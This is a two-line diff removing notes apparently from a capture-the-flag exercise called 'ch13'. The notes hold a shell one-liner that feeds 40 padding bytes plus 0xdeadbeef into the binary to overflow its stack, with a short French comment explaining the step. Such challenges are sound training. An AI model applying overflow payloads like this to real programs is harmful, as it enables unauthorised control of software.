@@ -1,2 +1,0 @@
-(python -c 'print "a" * 40 + "\xef\xbe\xad\xde"' ; cat) | ./ch13
-	boucle sur la stack sur 5b puis rajoutes le 0xdeadbeef
